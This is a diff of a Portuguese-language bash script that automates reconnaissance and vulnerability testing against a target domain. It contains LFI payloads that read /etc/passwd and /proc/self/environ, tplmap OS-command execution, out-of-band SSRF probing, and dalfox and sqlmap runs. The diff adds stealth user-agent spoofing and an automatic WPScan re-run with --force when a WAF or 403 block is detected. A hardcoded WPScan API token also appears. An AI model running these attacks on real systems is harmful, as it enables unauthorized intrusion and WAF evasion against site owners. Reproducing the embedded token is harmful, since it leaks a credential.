@@ -22,60 +22,114 @@
 # e amostras com print_top(...) para dar credibilidade sem poluir o console.
 
 set -euo pipefail
+FAST_MODE=${FAST_MODE:-1}
+SHOW_CMD=${SHOW_CMD:-0}
 
 # ===== UI =====
 C0="\033[0m"; CB="\033[34m"; CG="\033[32m"; CY="\033[33m"; CR="\033[31m"; CW="\033[97m"; B="\033[1m"; DIM="\033[2m"
-log(){  echo -e "${CB}ℹ${C0}  $*"; }
-ok(){   echo -e "${CG}✔${C0}  $*"; }
-warn(){ echo -e "${CY}⚠${C0}  $*"; }
-err(){  echo -e "${CR}✖${C0}  $*" >&2; }
+log(){  printf "${CB}ℹ${C0}  %s\n" "$*"; }
+ok(){   printf "${CG}✔${C0}  %s\n" "$*"; }
+warn(){ printf "${CY}⚠${C0}  %s\n" "$*"; }
+err(){  printf "${CR}✖${C0}  %s\n" "$*" >&2; }
 need(){ command -v "$1" >/dev/null 2>&1 || { err "ferramenta ausente: $1"; return 1; }; }
- # ===== Helpers genéricos =====
-countf(){ [[ -f "$1" ]] && wc -l < "$1" || echo 0; }
-sanitize_domain(){ local d="$1"; d="${d#http://}"; d="${d#https://}"; d="${d%%/*}"; echo "$d"; }
+
+# ===== Helpers genéricos =====
+countf(){ [[ -f "$1" ]] && wc -l < "$1" || printf "0"; }
+sanitize_domain(){ local d="$1"; d="${d#http://}"; d="${d#https://}"; d="${d%%/*}"; printf "%s" "$d"; }
 prep_dirs(){ DOMAIN="$1"; BASE="$HOME/recon/$DOMAIN"; TMP="/tmp/recon-$DOMAIN"; mkdir -p "$BASE"/{intel,subs,urls,vectors,findings} "$TMP" "$TMP/urls"; }
 
-banner(){ local t="$1"; local l=$(printf "%*s" $(( ${#t} + 6 )) | tr " " "═"); echo -e "${CW}${B}╔${l}╗${C0}"; printf "${CW}${B}║   ${C0}${B}%s${CW}${B}   ║${C0}\n" "$t"; echo -e "${CW}${B}╚${l}╝${C0}"; }
-hr(){ echo -e "${DIM}────────────────────────────────────────────────────────${C0}"; }
+# Box helpers (ASCII fallback)
+BOX_ASCII=${NO_UNICODE:-0}
+banner(){
+  local t="$1"
+  if [[ "$BOX_ASCII" == "1" ]]; then
+    printf "${B}==[ %s ]==${C0}\n" "$t"
+  else
+    local w=$(( ${#t} + 6 ))
+    local l; l=$(printf "%*s" "$w" | tr " " "═")
+    printf "${CW}${B}╔%s╗${C0}\n" "$l"
+    printf "${CW}${B}║   ${C0}${B}%s${CW}${B}   ║${C0}\n" "$t"
+    printf "${CW}${B}╚%s╝${C0}\n" "$l"
+  fi
+}
+hr(){
+  if [[ "$BOX_ASCII" == "1" ]]; then
+    printf "${DIM}%s${C0}\n" "-----------------------------------------------"
+  else
+    printf "${DIM}%s${C0}\n" "────────────────────────────────────────────────────────"
+  fi
+}
 
-print_top(){ # print up to N lines of a file with a prefix
-  local file="$1" n="${2:-5}" prefix=${3:-"  • "}
+print_top(){
+  local file="$1" n="${2:-5}" prefix="${3:-"    ↳ "}"
   [[ -s "$file" ]] || return 0
   local i=0
   while IFS= read -r l; do
     i=$((i+1)); printf "%s%s\n" "$prefix" "$l"
     [[ $i -ge $n ]] && break
   done < "$file"
-  [[ $(countf "$file") -gt $n ]] && echo "${DIM}  … ($(countf "$file") total)${C0}"
+  local total; total=$(countf "$file")
+  [[ $total -gt $n ]] && printf "${DIM}    … (%s total)${C0}\n" "$total"
 }
 
-# Executa comando com progresso (% baseado em tempo máximo estimado)
-# Uso: run_with_progress "Descrição amigável" bash -lc "comando…"
+# ===== Progresso (% por tempo) — corrigido tempo (mm:ss) e sem mojibake =====
+PROGRESS_MAX_SECS=${PROGRESS_MAX_SECS:-180}
+
 run_with_progress(){
   local title="$1"; shift
-  local max=${PROGRESS_MAX_SECS:-240}           # ajuste global se quiser
+  local max="$PROGRESS_MAX_SECS"
   local cmd=("$@")
-
-  echo -e "${CY}⟲${C0} $title"
-  echo -e "${DIM}↪ ${C0}${B}${cmd[*]}${C0}"
+  printf "${CY}⟲${C0} ${B}%s${C0}\n" "$title"
+  if [[ "$SHOW_CMD" == "1" ]]; then
+    printf "${DIM}↪ ${C0}%s\n" "${cmd[*]}"
+  fi
 
   ("${cmd[@]}") &
   local pid=$!
-  local start=$(date +%s)
+  local start; start=$(date +%s)
   tput civis 2>/dev/null || true
   while kill -0 "$pid" 2>/dev/null; do
     sleep 0.2
-    local el=$(( $(date +%s) - start ))
-    local pct=$(( el*100 / max ))
-    (( pct > 99 )) && pct=99
-    printf "\r${CB}[..]${C0} %3d%%  elapsed %02d:%02d" "$pct" $((el/60)) $((el%60))
+    local now; now=$(date +%s)
+    local el=$(( now - start ))
+    local pct=$(( el*100 / max )); (( pct > 99 )) && pct=99
+    local bar_len=26
+    local filled=$(( pct*bar_len/100 ))
+    local empty=$(( bar_len - filled ))
+    local bar; bar="$(printf '%0.s#' $(seq 1 $filled))$(printf '%0.s-' $(seq 1 $empty))"
+    printf "\r${CB}[%s]${C0} %3d%%  %02d:%02d" "$bar" "$pct" $((el/60)) $((el%60))
   done
   wait "$pid"; local rc=$?
-  local el=$(( $(date +%s) - start ))
-  printf "\r${CG}[OK]${C0}  100%% in %02d:%02d\n" $((el/60)) $((el%60))
+  local end; end=$(date +%s)
+  local el=$(( end - start ))
+  local bar_done; bar_done="$(printf '%0.s#' $(seq 1 26))"
+  printf "\r${CG}[%s]${C0} 100%%  %02d:%02d\n" "$bar_done" $((el/60)) $((el%60))
   tput cnorm 2>/dev/null || true
   return $rc
 }
+
+# ===== Input colaborador (Burp/Interactsh) =====
+ask_collab_url(){
+  if [[ -z "${COLLAB_URL:-}" ]]; then
+    read -rp "Você tem uma URL de colaboração (Burp/Interactsh)? [y/N] " yn
+    case "$yn" in
+      [Yy]*)
+        read -rp "Informe a URL (ex: https://abcd1234.oast.site): " url
+        if [[ -n "$url" ]]; then
+          export COLLAB_URL="$url"
+          ok "COLLAB_URL definido: $COLLAB_URL"
+        else
+          warn "Nenhuma URL fornecida, SSRF será desativado."
+        fi
+        ;;
+      *) warn "SSRF desativado (sem COLLAB_URL).";;
+    esac
+  fi
+}
+
+# Perfil de rede stealth (usado por curl em testadores)
+export STEALTH_UA="${STEALTH_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36}"
+alias curl='curl -A "$STEALTH_UA" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"'
 
 # ===== Python helpers para URLs =====
 make_url_variants() { # um param por vez -> NEWVAL
@@ -101,9 +155,7 @@ PY
 
 replace_param_value_all() { # todos os params -> NEWVAL
   local URL="$1" NEWVAL="$2"
-  python3 - "$URL" "$NEWVAL" <<'PY'
-import sys, urllib.parse
-url = sys.argv[1]; newval = sys.argv[2]
+@@ -62,326 +161,442 @@ url = sys.argv[1]; newval = sys.argv[2]
 u = urllib.parse.urlsplit(url)
 qs = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
 if not qs:
@@ -129,13 +181,15 @@ test_redirects(){ # verifica Location apontando para CANARY (sem fuzz list)
   need curl || return 0
   local list="$1" out="$2"; : > "$out"
   local CANARY="${REDIR_CANARY:-https://example.com/}"
-  local total=$(countf "$list"); local i=0; local found=0
+  local total i=0 found=0
+  total=$(countf "$list")
   [[ $total -eq 0 ]] && { ok "Open Redirect: nenhum vetor"; return 0; }
+  local CURMAX=10; [[ $FAST_MODE -eq 0 ]] && CURMAX=20
   while IFS= read -r url; do
     [[ -z "$url" ]] && continue
     i=$((i+1)); local pct=$(( i*100/total )); printf "\r${CB}[Redirect]${C0} %d/%d (%d%%)" "$i" "$total" "$pct"
     while IFS= read -r testurl; do
-      code=$(curl -s -I -m 10 -o /tmp/rd_hdr.$$ -w '%{http_code}' "$testurl" || true)
+      code=$(curl -s -I -m $CURMAX -o /tmp/rd_hdr.$$ -w '%{http_code}' "$testurl" || true)
       if [[ "$code" =~ ^30[1278]$ ]] && grep -qi "^Location:.*$CANARY" /tmp/rd_hdr.$$ 2>/dev/null; then
         echo "$url -> $testurl" >> "$out"; found=$((found+1)); break
       fi
@@ -154,14 +208,16 @@ test_lfi(){ # payloads curados + assinaturas
   need curl || return 0
   local list="$1" out="$2"; : > "$out"
   local payloads=("../../etc/passwd" "..%2f..%2fetc%2fpasswd" "..%252f..%252fetc%252fpasswd" "../../proc/self/environ" "../../windows/win.ini")
-  local total=$(countf "$list"); local i=0; local hits=0
+  local total i=0 hits=0
+  total=$(countf "$list")
   [[ $total -eq 0 ]] && { ok "LFI: nenhum vetor"; return 0; }
+  local CURL_MAX=10; [[ $FAST_MODE -eq 0 ]] && CURL_MAX=20
   while IFS= read -r url; do
     [[ -z "$url" ]] && continue
     i=$((i+1)); local pct=$(( i*100/total )); printf "\r${CB}[LFI]${C0} %d/%d (%d%%)" "$i" "$total" "$pct"
     for p in "${payloads[@]}"; do
       testurl=$(replace_param_value_all "$url" "$p")
-      body=$(curl -s --max-time 10 "$testurl" || true)
+      body=$(curl -s --max-time $CURL_MAX "$testurl" || true)
       if echo "$body" | grep -Eq '^root:.*:0:0:'; then echo "[PASSWD] $url -> $testurl" >> "$out"; hits=$((hits+1)); break; fi
       if echo "$body" | grep -Eq '^\[extensions\]|\[fonts\]'; then echo "[WININI] $url -> $testurl" >> "$out"; hits=$((hits+1)); break; fi
       if echo "$body" | grep -Eq '(^|;)PATH=|HTTP_USER_AGENT='; then echo "[ENV] $url -> $testurl" >> "$out"; hits=$((hits+1)); break; fi
@@ -181,13 +237,15 @@ test_ssrf(){ # OOB necessário (COLLAB_URL)
   local list="$1" out="$2"; : > "$out"
   local OOB="${COLLAB_URL:-}"
   [[ -z "$OOB" ]] && { warn "SSRF desativado (defina COLLAB_URL)"; return 0; }
-  local total=$(countf "$list"); local i=0; local sent=0
+  local total i=0 sent=0
+  total=$(countf "$list")
   [[ $total -eq 0 ]] && { ok "SSRF: nenhum vetor"; return 0; }
+  local CURL_MAX=10; [[ $FAST_MODE -eq 0 ]] && CURL_MAX=20
   while IFS= read -r url; do
     [[ -z "$url" ]] && continue
     i=$((i+1)); local pct=$(( i*100/total )); printf "\r${CB}[SSRF]${C0} %d/%d (%d%%)" "$i" "$total" "$pct"
     testurl=$(replace_param_value_all "$url" "$OOB")
-    curl -s --max-time 10 "$testurl" >/dev/null 2>&1 || true
+    curl -s --max-time $CURL_MAX "$testurl" >/dev/null 2>&1 || true
     echo "$url -> $testurl" >> "$out"; sent=$((sent+1))
   done < "$list"
   echo
@@ -201,12 +259,14 @@ test_ssti(){ # tplmap
     warn "tplmap não encontrado; SSTI desativado."
     return 0
   fi
-  local total=$(countf "$list"); local i=0; local pos=0
+  local total i=0 pos=0
+  total=$(countf "$list")
   [[ $total -eq 0 ]] && { ok "SSTI: nenhum vetor"; return 0; }
+  local TPL_TIMEOUT=8; [[ $FAST_MODE -eq 0 ]] && TPL_TIMEOUT=15
   while IFS= read -r url; do
     [[ -z "$url" ]] && continue
     i=$((i+1)); local pct=$(( i*100/total )); printf "\r${CB}[SSTI]${C0} %d/%d (%d%%)" "$i" "$total" "$pct"
-    tplmap -u "$url" --os-cmd id --timeout 8 --quiet >/tmp/tpl.$$ 2>/dev/null || true
+    tplmap -u "$url" --os-cmd id --timeout $TPL_TIMEOUT --quiet >/tmp/tpl.$$ 2>/dev/null || true
     if grep -qiE "(command output|uid=[0-9])" /tmp/tpl.$$ 2>/dev/null; then echo "$url" >> "$out"; pos=$((pos+1)); fi
   done < "$list"
   echo
@@ -238,50 +298,82 @@ run_bug_bounty(){
   for t in "${tools[@]}"; do need "$t" || { err "falta $t"; return 1; }; done
 
   banner "Bug Bounty — $DOMAIN"
+  ask_collab_url
 
   # Subdomínios
+  log "Subdomínios (subfinder + assetfinder)…"
   run_with_progress "Subfinder"  bash -lc "subfinder -d '$DOMAIN' -all -silent > '$TMP/subs1.txt' || true"
   run_with_progress "Assetfinder" bash -lc "assetfinder --subs-only '$DOMAIN' | sort -u > '$TMP/subs2.txt' || true"
   cat "$TMP"/subs*.txt 2>/dev/null | sort -u > "$BASE/subs/subdomains_all.txt" || true
-  local SUBS_TOTAL=$(countf "$BASE/subs/subdomains_all.txt")
+  local SUBS_TOTAL
+  SUBS_TOTAL=$(countf "$BASE/subs/subdomains_all.txt")
   ok "subdomínios encontrados: ${B}${SUBS_TOTAL}${C0}"
   print_top "$BASE/subs/subdomains_all.txt" 5 "    ↳ "
+  hr
 
   # Takeover
   : > "$BASE/subs/takeover.txt"
   run_with_progress "Subzy (takeover)" bash -lc "subzy run --targets '$BASE/subs/subdomains_all.txt' --hide_fails --verify_ssl --concurrency 50 -o '$BASE/subs/takeover.txt' >/dev/null 2>&1 || true"
-  local TAKE_POS=$(grep -i "vulnerable" "$BASE/subs/takeover.txt" 2>/dev/null | wc -l | tr -d ' ')
+  local TAKE_POS
+  TAKE_POS=$(grep -ic "vulnerable" "$BASE/subs/takeover.txt" 2>/dev/null || true)
   ok "takeover verificados: ${SUBS_TOTAL} | positivos: ${B}${TAKE_POS}${C0}"
   [[ $TAKE_POS -gt 0 ]] && print_top "$BASE/subs/takeover.txt" 5 "    ↳ "
+  hr
 
-  # HTTPX (tmp)
-  run_with_progress "HTTPX (vivos)" bash -lc "httpx -l '$BASE/subs/subdomains_all.txt' -silent -status-code -title -tech-detect -server -ip -tls -cdn -location -o '$TMP/httpx_live.txt' >/dev/null 2>&1 || true"
-  cut -d' ' -f1 "$TMP/httpx_live.txt" > "$TMP/subdomains_live.txt" || true
-  local LIVE=$(countf "$TMP/subdomains_live.txt"); local LIVE_PCT=0
+  # HTTPX (tmp, rápido)
+  log "HTTPX (filtrando vivos)…"
+  : > "$TMP/httpx_live.txt"
+  run_with_progress "HTTPX (vivos)" bash -lc \
+    "httpx -l '$BASE/subs/subdomains_all.txt' \
+            -silent -status-code -title -tech-detect -server -ip -tls -cdn -location \
+            -t ${HTTPX_THREADS:-150} -timeout ${HTTPX_TIMEOUT:-6} -retries ${HTTPX_RETRIES:-1} \
+            -o '$TMP/httpx_live.txt' >/dev/null 2>&1 || true"
+  if [[ -s "$TMP/httpx_live.txt" ]]; then
+    cut -d' ' -f1 "$TMP/httpx_live.txt" > "$TMP/subdomains_live.txt"
+  else
+    : > "$TMP/subdomains_live.txt"
+  fi
+  local LIVE LIVE_PCT; LIVE=$(countf "$TMP/subdomains_live.txt"); LIVE_PCT=0
   [[ $SUBS_TOTAL -gt 0 ]] && LIVE_PCT=$((100*LIVE/SUBS_TOTAL))
   ok "hosts vivos (tmp): ${B}${LIVE}${C0} (${LIVE_PCT}%)"
-  [[ $LIVE -gt 0 ]] && print_top "$TMP/subdomains_live.txt" 5 "    ↳ "
+  [[ $LIVE -gt 0 ]] && print_top "$TMP/subdomains_live.txt" 5
+  hr
 
   # URLs
+  log "Coleta de URLs…"
   : > "$BASE/urls/urls_all.txt"; mkdir -p "$TMP/urls"
-  run_with_progress "GAU (historico)"       bash -lc "echo '$DOMAIN' | gau --subs --providers wayback,commoncrawl,otx > '$TMP/urls/gau.txt' 2>/dev/null || true"
-  run_with_progress "waybackurls (archive)" bash -lc "echo '$DOMAIN' | waybackurls > '$TMP/urls/wayback.txt' 2>/dev/null || true"
+
+  ( echo "$DOMAIN" | gau --subs --providers wayback,commoncrawl,otx --threads "${GAU_THREADS:-8}" --timeout "${GAU_TIMEOUT:-25}" > "$TMP/urls/gau.txt" 2>/dev/null || true ) & pid_gau=$!
+  ( echo "$DOMAIN" | waybackurls > "$TMP/urls/wayback.txt" 2>/dev/null || true ) & pid_wb=$!
   if [[ $LIVE -gt 0 ]]; then
-    run_with_progress "Katana (crawl vivos)" bash -lc "katana -list '$TMP/subdomains_live.txt' -depth 3 -silent > '$TMP/urls/katana.txt' 2>/dev/null || true"
+    ( katana -list "$TMP/subdomains_live.txt" -depth "${KATANA_DEPTH:-2}" -silent -c "${KATANA_CONC:-20}" -retries "${KATANA_RETRIES:-1}" -timeout "${KATANA_TIMEOUT:-6}" > "$TMP/urls/katana.txt" 2>/dev/null || true ) & pid_kat=$!
   else
-    run_with_progress "Katana (root)"        bash -lc "katana -u 'https://$DOMAIN' -depth 2 -silent > '$TMP/urls/katana.txt' 2>/dev/null || true"
+    ( katana -u "https://$DOMAIN" -depth "${KATANA_DEPTH:-2}" -silent -c "${KATANA_CONC:-20}" -retries "${KATANA_RETRIES:-1}" -timeout "${KATANA_TIMEOUT:-6}" > "$TMP/urls/katana.txt" 2>/dev/null || true ) & pid_kat=$!
   fi
-  cat "$TMP/urls"/*.txt 2>/dev/null | sed 's/\s\+$//' | sort -u > "$BASE/urls/urls_all.txt" || true
-  ok "URLs: gau=${B}$(countf "$TMP/urls/gau.txt")${C0} | wayback=${B}$(countf "$TMP/urls/wayback.txt")${C0} | katana=${B}$(countf "$TMP/urls/katana.txt")${C0} | total=${B}$(countf "$BASE/urls/urls_all.txt")${C0} → $BASE/urls/urls_all.txt"
-  print_top "$BASE/urls/urls_all.txt" 5 "    ↳ "
+  run_with_progress "Consolidando URLs" bash -lc "while kill -0 $pid_gau 2>/dev/null || kill -0 $pid_wb 2>/dev/null || kill -0 $pid_kat 2>/dev/null; do sleep 0.2; done"
+  wait $pid_gau $pid_wb $pid_kat 2>/dev/null || true
+
+  cat "$TMP/urls"/*.txt 2>/dev/null | sed 's/[[:space:]]\+$//' | sort -u > "$BASE/urls/urls_all.txt" || true
+  grep -Eiv '\.(png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|mp4|mp3|avi|pdf|zip|rar|7z|gz|tar)(\?|$)' "$BASE/urls/urls_all.txt" > "$TMP/urls/urls_fast.txt" || true
+
+  local GAU WB KAT URLS
+  GAU=$(countf "$TMP/urls/gau.txt"); WB=$(countf "$TMP/urls/wayback.txt"); KAT=$(countf "$TMP/urls/katana.txt"); URLS=$(countf "$BASE/urls/urls_all.txt")
+  ok "URLs consolidadas"
+  printf "  • gau:    %s\n" "$GAU"
+  printf "  • wayback:%s\n" "$WB"
+  printf "  • katana: %s\n" "$KAT"
+  printf "  • total:  %s → %s\n" "$URLS" "$BASE/urls/urls_all.txt"
+  print_top "$TMP/urls/urls_fast.txt" 5
   hr
 
   # WordPress auto (a partir de URLs)
   log "Detectando WordPress por URLs (wp-content/wp-includes/wp-json/wp-admin)…"
   local WP_IND="$TMP/wp_hits.txt"; : > "$WP_IND"
-  grep -Eiq 'wp-content|wp-includes|wp-json|wp-admin' "$BASE/urls/urls_all.txt" && \
-    grep -Ei 'wp-content|wp-includes|wp-json|wp-admin' "$BASE/urls/urls_all.txt" > "$WP_IND" || true
-  local WP_URL_HITS=$(countf "$WP_IND")
+  if grep -Eiq 'wp-content|wp-includes|wp-json|wp-admin' "$BASE/urls/urls_all.txt"; then
+    grep -Ei 'wp-content|wp-includes|wp-json|wp-admin' "$BASE/urls/urls_all.txt" > "$WP_IND"
+  fi
+  local WP_URL_HITS
+  WP_URL_HITS=$(countf "$WP_IND")
   if [[ $WP_URL_HITS -gt 0 ]]; then
     ok "indicadores WP em URLs: ${B}${WP_URL_HITS}${C0}"
     # extrair hosts únicos e rodar wpscan por domínio
@@ -297,7 +389,8 @@ run_bug_bounty(){
                --random-user-agent --disable-tls-checks \
                --api-token "$TOKEN" \
                -o "$BASE/intel/wpscan_$h.txt" >/dev/null 2>&1 || true
-        local vcnt=$(grep -i "vulnerab" "$BASE/intel/wpscan_$h.txt" 2>/dev/null | wc -l | tr -d ' ')
+        local vcnt
+        vcnt=$(grep -ic "vulnerab" "$BASE/intel/wpscan_$h.txt" 2>/dev/null || true)
         ok "WPScan $h: possíveis ocorrências=${B}${vcnt}${C0} → $BASE/intel/wpscan_$h.txt"
       done < "$WP_HOSTS"
     else
@@ -321,23 +414,23 @@ run_bug_bounty(){
   hr
 
   # Testadores direcionados (sem fuzzing)
-  [[ -s "$BASE/vectors/redirect.txt" ]] && { log "Testando Open Redirect…"; test_redirects "$BASE/vectors/redirect.txt" "$BASE/findings/redirect.txt"; hr; }
-  [[ -s "$BASE/vectors/lfi.txt"      ]] && { log "Testando LFI…";            test_lfi       "$BASE/vectors/lfi.txt"      "$BASE/findings/lfi.txt"; hr; }
-  [[ -s "$BASE/vectors/ssrf.txt"     ]] && { log "Testando SSRF…";           test_ssrf      "$BASE/vectors/ssrf.txt"     "$BASE/findings/ssrf.txt"; hr; }
-  [[ -s "$BASE/vectors/ssti.txt"     ]] && { log "Testando SSTI (tplmap)…";  test_ssti      "$BASE/vectors/ssti.txt"     "$BASE/findings/ssti.txt"; hr; }
+  pids=()
+  [[ -s "$BASE/vectors/redirect.txt" ]] && { log "Testando Open Redirect…"; (test_redirects "$BASE/vectors/redirect.txt" "$BASE/findings/redirect.txt"; hr) & pids+=($!); }
+  [[ -s "$BASE/vectors/lfi.txt"      ]] && { log "Testando LFI…";            (test_lfi       "$BASE/vectors/lfi.txt"      "$BASE/findings/lfi.txt"; hr) & pids+=($!); }
+  [[ -s "$BASE/vectors/ssrf.txt"     ]] && { log "Testando SSRF…";           (test_ssrf      "$BASE/vectors/ssrf.txt"     "$BASE/findings/ssrf.txt"; hr) & pids+=($!); }
+  [[ -s "$BASE/vectors/ssti.txt"     ]] && { log "Testando SSTI (tplmap)…";  (test_ssti      "$BASE/vectors/ssti.txt"     "$BASE/findings/ssti.txt"; hr) & pids+=($!); }
+  for pid in "${pids[@]}"; do wait "$pid"; done
 
   # XSS (dalfox) com progresso, silencioso
   if command -v dalfox >/dev/null 2>&1 && [[ -s "$BASE/vectors/xss.txt" ]]; then
     log "Testando XSS (dalfox, POC)…"
-    local TOTAL=$(countf "$BASE/vectors/xss.txt"); local i=0; : > "$BASE/findings/xss.dalfox.txt"
-    while IFS= read -r u; do
-      i=$((i+1)); local pct=$((i*100/TOTAL)); printf "\r${CB}[XSS]${C0} %d/%d (%d%%)" "$i" "$TOTAL" "$pct"
-      dalfox url "$u" --only-poc --no-color --silence --format plain >> "$BASE/findings/xss.dalfox.txt" 2>/dev/null || true
-    done < "$BASE/vectors/xss.txt"
-    echo
+    : > "$BASE/findings/xss.dalfox.txt"
+    local DALFOX_P=20
+    [[ $FAST_MODE -eq 0 ]] && DALFOX_P=10
+    run_with_progress "Dalfox" bash -lc "xargs -a '$BASE/vectors/xss.txt' -r -P $DALFOX_P -I{} dalfox url '{}' --only-poc --no-color --silence --format plain >> '$BASE/findings/xss.dalfox.txt' 2>/dev/null || true"
     if [[ -s "$BASE/findings/xss.dalfox.txt" ]]; then
       ok "XSS positivos: $(countf "$BASE/findings/xss.dalfox.txt") → $BASE/findings/xss.dalfox.txt"
-      print_top "$BASE/findings/xss.dalfox.txt" 5 "    ↳ "
+      print_top "$BASE/findings/xss.dalfox.txt" 5
     else
       ok "XSS: nenhum resultado"
     fi
@@ -347,13 +440,14 @@ run_bug_bounty(){
   # SQLi com sqlmap (rápido)
   if command -v sqlmap >/dev/null 2>&1 && [[ -s "$BASE/vectors/sqli.txt" ]]; then
     log "Testando SQLi (sqlmap rápido)…"
-    sqlmap -m "$BASE/vectors/sqli.txt" --batch --random-agent --level=2 --risk=1 --threads=5 --time-sec=5 -v 0 \
-           --results-dir="$TMP/sqlmap" >/dev/null 2>&1 || true
+    local SQL_TIME=5
+    [[ $FAST_MODE -eq 0 ]] && SQL_TIME=10
+    run_with_progress "sqlmap" bash -lc "sqlmap -m '$BASE/vectors/sqli.txt' --batch --random-agent --level=2 --risk=1 --threads=5 --time-sec=$SQL_TIME -v 0 --results-dir='$TMP/sqlmap' >/dev/null 2>&1 || true"
     grep -RHiE "is vulnerable|appears to be injectable|parameter .* is vulnerable" "$TMP/sqlmap" 2>/dev/null \
       | sort -u > "$BASE/findings/sqli.txt" || true
     if [[ -s "$BASE/findings/sqli.txt" ]]; then
       ok "SQLi positivos: $(countf "$BASE/findings/sqli.txt") → $BASE/findings/sqli.txt"
-      print_top "$BASE/findings/sqli.txt" 5 "    ↳ "
+      print_top "$BASE/findings/sqli.txt" 5
     else
       ok "SQLi: nenhum resultado"
     fi
@@ -378,9 +472,37 @@ run_wpscan(){
   local DOMAIN="$1"; prep_dirs "$DOMAIN"; need wpscan || return 1
   banner "WPScan — $DOMAIN"
   local TOKEN="${WPVULNDB_API_TOKEN:-GRa5RV3wTapgEXZKKMcdQwZD3F9jwTYHaBMb4swZ05Q}"
-  run_with_progress "WPScan completo" bash -lc "wpscan --url 'https://$DOMAIN' --enumerate u,ap,at,cb,dbe --random-user-agent --disable-tls-checks --api-token '$TOKEN' -o '$BASE/intel/wpscan.txt' >/dev/null 2>&1 || true"
-  local WP_VULN=$(grep -i "vulnerab" "$BASE/intel/wpscan.txt" 2>/dev/null | wc -l | tr -d ' ')
+
+  # Perfil stealth: cabeçalhos realistas, UA randômico e limites conservadores
+  local base_cmd=(
+    wpscan
+    --url "https://$DOMAIN"
+    --enumerate u,ap,at,cb,dbe
+    --random-user-agent
+    --headers "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+    --headers "Accept-Language: en-US,en;q=0.9"
+    --headers "Referer: https://$DOMAIN/"
+    --max-threads 5
+    --throttle 0.4
+    --request-timeout 10
+    --connect-timeout 10
+    --disable-tls-checks
+    --api-token "$TOKEN"
+    --no-update
+    -o "$BASE/intel/wpscan.txt"
+  )
+
+  run_with_progress "WPScan (stealth)" bash -lc "${base_cmd[*]} >/dev/null 2>&1 || true"
+
+  if grep -qiE '403|WAF|blocked|use --force' "$BASE/intel/wpscan.txt" 2>/dev/null; then
+    warn "403/WAF detectado — reexecutando com --force (stealth conservador)…"
+    base_cmd+=( --force --max-threads 3 --throttle 0.7 )
+    run_with_progress "WPScan (stealth + force)" bash -lc "${base_cmd[*]} >/dev/null 2>&1 || true"
+  fi
+
+  local WP_VULN; WP_VULN=$(grep -i "vulnerab" "$BASE/intel/wpscan.txt" 2>/dev/null | wc -l | tr -d ' ')
   ok "salvo → $BASE/intel/wpscan.txt (possíveis ocorrências: ${B}${WP_VULN}${C0})"
+  hr
 }
 run_passive(){
   local DOMAIN="$1"; prep_dirs "$DOMAIN"
@@ -395,7 +517,7 @@ run_passive(){
     reg=$(grep -iE 'Registrar:|Registrar Name' "$BASE/intel/passive/whois.txt" | head -1 | sed 's/^[[:space:]]*//')
     cr=$(grep -iE 'Creation Date:|Created On' "$BASE/intel/passive/whois.txt" | head -1 | sed 's/^[[:space:]]*//')
     exp=$(grep -iE 'Expiry Date:|Registrar Registration Expiration Date' "$BASE/intel/passive/whois.txt" | head -1 | sed 's/^[[:space:]]*//')
-    ns=$(grep -iE '^Name Server' "$BASE/intel/passive/whois.txt" | wc -l | tr -d ' ')
+    ns=$(grep -ic '^Name Server' "$BASE/intel/passive/whois.txt" 2>/dev/null || true)
     [[ -n "$reg" ]] && echo "  • $reg"
     [[ -n "$cr"  ]] && echo "  • $cr"
     [[ -n "$exp" ]] && echo "  • $exp"
@@ -423,7 +545,7 @@ run_passive(){
   # DNS (A/AAAA/CNAME/MX/NS/TXT)
   if command -v dnsx >/dev/null 2>&1; then
     echo "$DOMAIN" > "$TMP/domain.txt"
-    run_with_progress "DNS (dnsx)" bash -lc "dnsx -l '$TMP/domain.txt' -a -aaaa -cname -mx -ns -txt -silent > '$BASE/intel/passive/dns_records.txt' || true"
+    run_with_progress "DNS (dnsx)" bash -lc "dnsx -l '$TMP/domain.txt' -a -aaaa -cname -mx -ns -txt -silent -retries 1 -timeout 5 > '$BASE/intel/passive/dns_records.txt' || true"
     echo "  • Registros (linhas): $(countf "$BASE/intel/passive/dns_records.txt")"
     print_top "$BASE/intel/passive/dns_records.txt" 5 "    ↳ "
     hr
@@ -444,7 +566,7 @@ run_passive(){
 
   # HTTPX root
   if command -v httpx >/dev/null 2>&1; then
-    run_with_progress "HTTPX (root)" bash -lc "httpx -u 'https://$DOMAIN' -silent -status-code -title -tech-detect -server -ip -tls -cdn -location > '$BASE/intel/passive/httpx_root.txt' || true"
+    run_with_progress "HTTPX (root)" bash -lc "httpx -u 'https://$DOMAIN' -silent -status-code -title -tech-detect -server -ip -tls -cdn -location -retries 1 -timeout 5 > '$BASE/intel/passive/httpx_root.txt' || true"
     echo "  • Fingerprint:"
     print_top "$BASE/intel/passive/httpx_root.txt" 3 "    ↳ "
     hr
